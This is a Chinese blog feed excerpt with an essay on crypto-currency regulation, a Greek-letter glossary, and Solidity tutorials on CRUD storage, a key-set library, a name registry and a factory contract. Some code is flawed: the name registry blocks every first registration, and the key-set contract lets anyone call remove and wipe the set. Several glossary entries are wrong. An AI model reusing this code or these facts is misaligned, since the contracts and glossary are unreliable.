<p>从比特币缺乏基础资产支撑，到各类稳定代币的探索，或基于法币抵押，或基于算法，再到监管部门的介入，基于法币抵押的稳定代币因对法币的价值锚定得到增信，再到近期 JPM Coin、Facebook Libra的出现，虚拟货币价值不稳定和不合规的问题有望得到解决。因此，加密货币不再一定就是虚拟货币。</p>
<p>加密货币已经有可能成为真正意义上的货币，它不一定是数字M0，也有可能是比银行存款货币更高层次的货币：Mn。与数字M0相比，M1、M2……Mn等高层次货币的数字化或更具有想想空间。</p>
<p>中央银行一向被认为不适合承担数字货币供给的角色。主要担忧当数字货币向C端发行流通时，中央银行可能面临极大的服务压力和成本。比如，加拿大央行Jasper项目、新加坡金管局Ubin项目、欧洲中央银行和日本中央银行Stella项目等，正在试验加密货币技术，但还停留在B端应用场景。</p>
<p>按照IMF经济学家的观点，支付宝和微信支付本质上就是央行数字货币。支付宝和微信支付是100%备付准备金存缴，Libra白皮书提到100%资产储备，前者是将所有资金存缴中央银行，后者将资金交由第三方托管。事实上，100%准备金存缴之后，如何激励商业机构的行为，既要马儿跑，又要马儿不吃草，这有可能是一个新的命题。</p>
<p>技术上，100%准备经存缴意味着数字货币的发行、流通、收回、销毁等全生命周期均要依附于传统账户体系，这增大了中央银行中心系统的压力和复杂性，而且，难以实现“账户松耦合”的要求，自金融创新不容易展开，跨境支付的想象空间亦大打折扣。相比较，央行加密货币（Central Bank Crypto-Currencie，CBCC）可以让客户真正自主管理自己的货币，而不是托付给第三方，赋予客户自主掌控的能力，也可以超越Swift，开辟跨境支付的全新战场。</p>
<p>英格兰银行行长Carney认为类似Libra的数字货币将是全球储备货币的更好选择。数字货币不仅仅是法币的数字化，就像数字资产不仅仅是资产数字化那么简单，未来的数字货币需要修补现有货币体系的弊端，超越美元，升级换代。</p>
<h3 id="重新审视传统监管范式"><a href="#重新审视传统监管范式" class="headerlink" title="重新审视传统监管范式"></a>重新审视传统监管范式</h3><p>传统上以牌照管理为关键、以金融机构为抓手、以开立在金融机构的账户为核心的监管范式，需要重新审视。</p>
<p>一是机构准入的牌照管理，应转变为用户转入的权限管理。在自金融模式下，中介机构不再是抓手，用户才是关键。用户入场须经过相关认证机构的身份认证和核验，业务过程须与身份认证隔离，并采用密码学原语与方案来实现交易身份以及内容隐私保护，管理部门则有权开展穿透式监管。在此基础上，各国监管部门根据客户的数字身份归集本国居民，划定数字司法辖区，对本国居民设置各类业务参与权限。本国居民与非本国居民的金融业务和资金往来，由各国监管部门按照各自的资本账户开放和跨国金融监管政策进行规制。以Facebook受监管的金融子公司Calibra为例，其首个产品就是Libra数字钱包，Facebook通过Calibra钱包将社交用户的身份信息与Libra用户的区块链地址进行连接，钱包代替了持牌金融机构成为自金融环境下被监管的主体，这样可以按照司法辖区的具体要求落实监管策略，兼顾了用户隐私保护与监管合规的要求。</p>
<p>二是业务核准，应增加智能合约审核。智能合约在上链之前必须经过相关部门的验证，判断程序是否能按照监管部门的政策预期运行，必要时，监管部门可阻止不合规的智能合约上链或者关闭本国居民执行该智能合约，同时还可建立允许代码暂停或终止执行的监管干预机制。此外，智能合约的参数设置也是一种监管手段，监管部门亦可通过调整或干预智能合约参数，来管控自金融业务规模和风险。</p>
]]></content>
      <tags>
        <tag>数字资产</tag>
      </tags>
  </entry>
  <entry>
    <title>数学符号- 朝花夕拾</title>
    <url>/2018/07/23/%E6%95%B0%E5%AD%A6%E7%AC%A6%E5%8F%B7-%E6%9C%9D%E8%8A%B1%E5%A4%95%E6%8B%BE/</url>
    <content><![CDATA[<ol>
<li>Α α alpha a:lf 阿尔法 角度；系数</li>
<li>Β β beta bet 贝塔 磁通系数；角度；系数</li>
<li>Γ γ gamma ga:m 伽马 电导系数（小写）</li>
<li>Δ δ delta delt 德尔塔 变动；密度；屈光度</li>
<li>Ε ε epsilon  伊普西龙 对数之基数</li>
<li>Ζ ζ zeta zat 截塔 系数；方位角；阻抗；相对粘度；原子序数</li>
<li>Η η eta eit 艾塔 磁滞系数；效率（小写）</li>
<li>Θ θ thet θit 西塔 温度；相位角</li>
<li>Ι ι iot aiot 约塔 微小，一点儿</li>
<li>Κ κ kappa kap 卡帕 介质常数</li>
<li>∧ λ lambda lambd 兰布达波长（小写）；体积</li>
<li>Μ μ mu mju 缪 磁导系数；微（千分之一）；放大因数（小写）</li>
<li>Ν ν nu nju 纽 磁阻系数</li>
<li>Ξ ξ xi ksi 克西</li>
<li>Ο ο omicron 奥密克戎</li>
<li>∏ π pi pai 派 圆周率=圆周÷直径=3.1416</li>
<li>Ρ ρ rho rou 肉 电阻系数（小写）</li>
<li>∑ σ sigma  西格马 总和（大写），表面密度；跨导（小写）</li>
<li>Τ τ tau tau 套 时间常数</li>
<li>Υ υ upsilon 宇普西龙 位移</li>
<li>Φ φ phi fai 佛爱 磁通；角</li>
<li>Χ χ chi phai 西</li>
<li>Ψ ψ psi psai 普西 角速；介质电通量（静电力线）；角</li>
<li>Ω ω omega o`miga 欧米伽 欧姆（大写）；角速（小写）；角</li>
</ol>
]]></content>
      <tags>
        <tag>数学符号</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约-CURD的详细分析</title>
    <url>/2020/01/15/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CURD%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=<span class="number">0.6</span><span class="number">.0</span> &lt;<span class="number">0.7</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract UserCrud &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 业务主数据结构</span></span><br><span class="line">  struct UserStruct &#123;</span><br><span class="line">    bytes32 userEmail;</span><br><span class="line">    uint userAge;</span><br><span class="line">    uint index;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 将业务主数据存储在 mapping 中，用户地址是用户数据的索引</span></span><br><span class="line">  <span class="comment">// address(key) ---&gt; UserStruct</span></span><br><span class="line">  <span class="comment">// 0x1 ---&gt; userEmail:alice@co.com, userAge:22</span></span><br><span class="line">  <span class="comment">// 0x2 ---&gt; userEmail:bob@home.com, userAge:44</span></span><br><span class="line">  <span class="comment">// 以上为 userStructs 中的存储内容</span></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> UserStruct) private userStructs;</span><br><span class="line">  <span class="comment">// 用户地址被收集进入一个数组 userIndex</span></span><br><span class="line">  address[] private userIndex;</span><br><span class="line">  <span class="comment">// 反馈新用户</span></span><br><span class="line">  event LogNewUser   (address indexed userAddress, uint index, bytes32 userEmail, uint userAge);</span><br><span class="line">  <span class="comment">// 反馈用户更新</span></span><br><span class="line">  event LogUpdateUser(address indexed userAddress, uint index, bytes32 userEmail, uint userAge);</span><br><span class="line">  <span class="comment">// 反馈用户删除</span></span><br><span class="line">  event LogDeleteUser(address indexed userAddress, uint index);</span><br><span class="line">  <span class="comment">// 判断入参的用户是否有与记录中的用户重合，即用户是否已经存在</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isUser</span>(<span class="params">address userAddress</span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">view</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span>(<span class="params">bool isIndeed</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(userIndex.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> (userIndex[userStructs[userAddress].index] == userAddress);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 插入新的用户主数据</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">insertUser</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">    address userAddress, </span></span></span><br><span class="line"><span class="function"><span class="params">    bytes32 userEmail, </span></span></span><br><span class="line"><span class="function"><span class="params">    uint    userAge</span>) </span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span>(<span class="params">uint index</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">isUser(userAddress)</span>)</span> &#123;revert(<span class="string">&quot;this user already exist.&quot;</span>);&#125;</span><br><span class="line">    userStructs[userAddress].userEmail = userEmail;</span><br><span class="line">    userStructs[userAddress].userAge   = userAge;</span><br><span class="line">    userIndex.push(userAddress);</span><br><span class="line">    userStructs[userAddress].index     = userIndex.length-<span class="number">1</span>;</span><br><span class="line">    emit LogNewUser(</span><br><span class="line">        userAddress, </span><br><span class="line">        userStructs[userAddress].index, </span><br><span class="line">        userEmail, </span><br><span class="line">        userAge);</span><br><span class="line">    <span class="keyword">return</span> userIndex.length-<span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 删除旧的用户主数据</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">deleteUser</span>(<span class="params">address userAddress</span>) </span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span>(<span class="params">uint index</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">!isUser(userAddress)</span>)</span> &#123;revert(<span class="string">&quot;only other user can deleteUser.&quot;</span>);&#125;</span><br><span class="line">    uint rowToDelete = userStructs[userAddress].index;</span><br><span class="line">    address keyToMove = userIndex[userIndex.length-<span class="number">1</span>];</span><br><span class="line">    userIndex[rowToDelete] = keyToMove;</span><br><span class="line">    userStructs[keyToMove].index = rowToDelete;</span><br><span class="line">    userIndex.pop();</span><br><span class="line">    emit LogDeleteUser(</span><br><span class="line">        userAddress, </span><br><span class="line">        rowToDelete);</span><br><span class="line">    emit LogUpdateUser(</span><br><span class="line">        keyToMove,</span><br><span class="line">        rowToDelete,</span><br><span class="line">        userStructs[keyToMove].userEmail,</span><br><span class="line">        userStructs[keyToMove].userAge);</span><br><span class="line">    <span class="keyword">return</span> rowToDelete;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 获取用户主数据</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getUser</span>(<span class="params">address userAddress</span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span> </span></span><br><span class="line"><span class="function">    <span class="title">view</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span>(<span class="params">bytes32 userEmail, uint userAge, uint index</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">!isUser(userAddress)</span>)</span> &#123;revert(<span class="string">&quot;only exist user can be run by getUser.&quot;</span>);&#125;</span><br><span class="line">    <span class="keyword">return</span>(</span><br><span class="line">      userStructs[userAddress].userEmail, </span><br><span class="line">      userStructs[userAddress].userAge, </span><br><span class="line">      userStructs[userAddress].index);</span><br><span class="line">  &#125; </span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">updateUserEmail</span>(<span class="params">address userAddress, bytes32 userEmail</span>) </span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span>(<span class="params">bool success</span>) </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">!isUser(userAddress)</span>)</span> &#123;revert(<span class="string">&quot;only exist user can updateUserEmail.&quot;</span>);&#125;</span><br><span class="line">    userStructs[userAddress].userEmail = userEmail;</span><br><span class="line">    emit LogUpdateUser(</span><br><span class="line">      userAddress, </span><br><span class="line">      userStructs[userAddress].index,</span><br><span class="line">      userEmail, </span><br><span class="line">      userStructs[userAddress].userAge);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">updateUserAge</span>(<span class="params">address userAddress, uint userAge</span>) </span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span>(<span class="params">bool success</span>) </span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">!isUser(userAddress)</span>)</span>  &#123;revert(<span class="string">&quot;only exist user can updateUserAge.&quot;</span>);&#125;</span><br><span class="line">    userStructs[userAddress].userAge = userAge;</span><br><span class="line">    emit LogUpdateUser(</span><br><span class="line">      userAddress, </span><br><span class="line">      userStructs[userAddress].index,</span><br><span class="line">      userStructs[userAddress].userEmail, </span><br><span class="line">      userAge);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getUserCount</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">view</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span>(<span class="params">uint count</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> userIndex.length;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getUserAtIndex</span>(<span class="params">uint index</span>)</span></span><br><span class="line"><span class="function">    <span class="title">public</span></span></span><br><span class="line"><span class="function">    <span class="title">view</span></span></span><br><span class="line"><span class="function">    <span class="title">returns</span>(<span class="params">address userAddress</span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> userIndex[index];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>remix 调试如下图：</p>
<p><img src="/2020/01/15/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CURD%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/1.png"></p>
<p>将上述模型进一步提炼为<a href="https://github.com/rob-Hitchens/UnorderedKeySet">库文件</a>：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity <span class="number">0.5</span><span class="number">.1</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> UnorderedKeySet v0.93</span></span><br><span class="line"><span class="comment">Library for managing CRUD operations in dynamic key sets.</span></span><br><span class="line"><span class="comment">https://github.com/rob-Hitchens/UnorderedKeySet</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">library UnorderedKeySetLib &#123;</span><br><span class="line">    </span><br><span class="line">    struct <span class="built_in">Set</span> &#123;</span><br><span class="line">        mapping(<span class="function"><span class="params">bytes32</span> =&gt;</span> uint) keyPointers;</span><br><span class="line">        bytes32[] keyList;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="built_in">Set</span> storage self, bytes32 key</span>) <span class="title">internal</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(key != <span class="number">0x0</span>, <span class="string">&quot;UnorderedKeySet(100) - Key cannot be 0x0&quot;</span>);</span><br><span class="line">        <span class="built_in">require</span>(!exists(self, key), <span class="string">&quot;UnorderedKeySet(101) - Key already exists in the set.&quot;</span>);</span><br><span class="line">        self.keyPointers[key] = self.keyList.push(key)-<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params"><span class="built_in">Set</span> storage self, bytes32 key</span>) <span class="title">internal</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(exists(self, key), <span class="string">&quot;UnorderedKeySet(102) - Key does not exist in the set.&quot;</span>);</span><br><span class="line">        bytes32 keyToMove = self.keyList[count(self)-<span class="number">1</span>];</span><br><span class="line">        uint rowToReplace = self.keyPointers[key];</span><br><span class="line">        self.keyPointers[keyToMove] = rowToReplace;</span><br><span class="line">        self.keyList[rowToReplace] = keyToMove;</span><br><span class="line">        <span class="keyword">delete</span> self.keyPointers[key];</span><br><span class="line">        self.keyList.length--;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"><span class="built_in">Set</span> storage self</span>) <span class="title">internal</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span>(self.keyList.length);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exists</span>(<span class="params"><span class="built_in">Set</span> storage self, bytes32 key</span>) <span class="title">internal</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(self.keyList.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span> self.keyList[self.keyPointers[key]] == key;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">keyAtIndex</span>(<span class="params"><span class="built_in">Set</span> storage self, uint index</span>) <span class="title">internal</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">bytes32</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> self.keyList[index];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">nukeSet</span>(<span class="params"><span class="built_in">Set</span> storage self</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="keyword">delete</span> self.keyList;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 合约只需要维护keyList即可</span></span><br><span class="line">contract UnorderedKeySet &#123;</span><br><span class="line">    </span><br><span class="line">    using UnorderedKeySetLib <span class="keyword">for</span> UnorderedKeySetLib.Set;</span><br><span class="line">    UnorderedKeySetLib.Set set;</span><br><span class="line">    </span><br><span class="line">    event LogUpdate(address sender, string action, bytes32 key);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">exists</span>(<span class="params">bytes32 key</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> set.exists(key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params">bytes32 key</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        set.insert(key);</span><br><span class="line">        emit LogUpdate(msg.sender, <span class="string">&quot;insert&quot;</span>, key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">remove</span>(<span class="params">bytes32 key</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        set.remove(key);</span><br><span class="line">        emit LogUpdate(msg.sender, <span class="string">&quot;remove&quot;</span>, key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">count</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> set.count();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">keyAtIndex</span>(<span class="params">uint index</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span>(<span class="params">bytes32</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> set.keyAtIndex(index);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">nukeSet</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        set.nukeSet();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另外 rob-Hitchens 使用 solidity 写了一个红黑树，地址如下：</p>
<p><a href="https://github.com/rob-Hitchens/OrderStatisticsTree">https://github.com/rob-Hitchens/OrderStatisticsTree</a></p>
<p>有向图：</p>
<p><a href="https://github.com/rob-Hitchens/GraphLib">https://github.com/rob-Hitchens/GraphLib</a></p>
<p>关联文档：</p>
<ol>
<li><a href="https://willzhuang.github.io/2020/01/15/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CURD%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">智能合约-CURD的详细分析</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E8%87%AA%E6%AF%81%E6%A8%A1%E5%BC%8F/">智能合约-自毁模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6%E6%A8%A1%E5%BC%8F/">智能合约-工厂合约模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%90%8D%E5%AD%97%E7%99%BB%E5%BD%95%E6%A8%A1%E5%BC%8F/">智能合约-名字登录模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/">智能合约-退款方式</a></li>
</ol>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约-名字登录模式</title>
    <url>/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%90%8D%E5%AD%97%E7%99%BB%E5%BD%95%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<p>​    工厂合约的地址如果经常变化，就必须追踪这些合约。在这种情况下，就可以使用名字登录模式，存储合约名到合约地址的映射mapping，同时提供根据合约名来查找合约地址的功能，甚至还可以追踪版本。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line"></span><br><span class="line">contract NameRegistry &#123;</span><br><span class="line">    struct ContractDetails &#123;</span><br><span class="line">        address owner;</span><br><span class="line">        address contractAddress;</span><br><span class="line">        uint16 version;</span><br><span class="line">    &#125;</span><br><span class="line">    mapping(<span class="function"><span class="params">string</span> =&gt;</span> ContractDetails) registry;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">registerName</span>(<span class="params">string memory name, address addr, uint16 ver</span>) <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 版本号码从1开始</span></span><br><span class="line">        <span class="built_in">require</span>(ver &gt;= <span class="number">1</span>);</span><br><span class="line">        ContractDetails memory info = registry[name];</span><br><span class="line">        <span class="built_in">require</span>(info.owner == msg.sender);</span><br><span class="line">        <span class="comment">// 如果在当前的registry不存在的话，创建记录</span></span><br><span class="line">        <span class="function"><span class="title">if</span>(<span class="params">info.contractAddress == address(<span class="number">0</span>)</span>)</span> &#123;</span><br><span class="line">            info = ContractDetails(&#123;</span><br><span class="line">                owner:msg.sender,</span><br><span class="line">                contractAddress:addr,</span><br><span class="line">                version:ver</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            info.version = ver;</span><br><span class="line">            info.contractAddress = addr;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 修改 registry 里的记录</span></span><br><span class="line">        registry[name] = info;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getContractDetails</span>(<span class="params">string memory name</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address, uint16</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span>(registry[name].contractAddress, registry[name].version);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过 <code>getContractDetails(name)</code> 获得合约地址和指定版本的合约。 </p>
<p>关联文档：</p>
<ol>
<li><a href="https://willzhuang.github.io/2020/01/15/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CURD%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">智能合约-CURD的详细分析</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E8%87%AA%E6%AF%81%E6%A8%A1%E5%BC%8F/">智能合约-自毁模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6%E6%A8%A1%E5%BC%8F/">智能合约-工厂合约模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%90%8D%E5%AD%97%E7%99%BB%E5%BD%95%E6%A8%A1%E5%BC%8F/">智能合约-名字登录模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/">智能合约-退款方式</a></li>
</ol>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约-工厂合约模式</title>
    <url>/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.12</span>;</span><br><span class="line"></span><br><span class="line">contract AutoShop &#123;</span><br><span class="line">    address[] autoAssets;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createChildContract</span>(<span class="params">string memory brand, string memory model</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 增加检查：ether是否足够支付 car</span></span><br><span class="line">        address newAutoAsset = address(<span class="keyword">new</span> AutoAsset(brand, model, msg.sender));</span><br><span class="line">        autoAssets.push(newAutoAsset);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getDeployChildContracts</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">address[] memory</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> autoAssets;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AutoAsset &#123;</span><br><span class="line">    string brand;</span><br><span class="line">    string model;</span><br><span class="line">    address owner;</span><br><span class="line">    <span class="title">constructor</span>(<span class="params">string memory _brand, string memory _model, address _owner</span>) <span class="title">public</span> &#123;</span><br><span class="line">        brand = _brand;</span><br><span class="line">        model = _model;</span><br><span class="line">        owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>address newAutoAsset = address(new AutoAsset(...)</code> 出发了一个交易，将子合约部署到区块链并返回合约地址。同时，将合约地址存储到数组 <code>address[] autoAssets</code> 中。</p>
<p>关联文档：</p>
<ol>
<li><a href="https://willzhuang.github.io/2020/01/15/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-CURD%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/">智能合约-CURD的详细分析</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E8%87%AA%E6%AF%81%E6%A8%A1%E5%BC%8F/">智能合约-自毁模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%B7%A5%E5%8E%82%E5%90%88%E7%BA%A6%E6%A8%A1%E5%BC%8F/">智能合约-工厂合约模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E5%90%8D%E5%AD%97%E7%99%BB%E5%BD%95%E6%A8%A1%E5%BC%8F/">智能合约-名字登录模式</a></li>
<li><a href="https://willzhuang.github.io/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E9%80%80%E6%AC%BE%E6%96%B9%E5%BC%8F/">智能合约-退款方式</a></li>
</ol>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>智能合约-自毁模式</title>
    <url>/2020/09/18/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6-%E8%87%AA%E6%AF%81%E6%A8%A1%E5%BC%8F/</url>
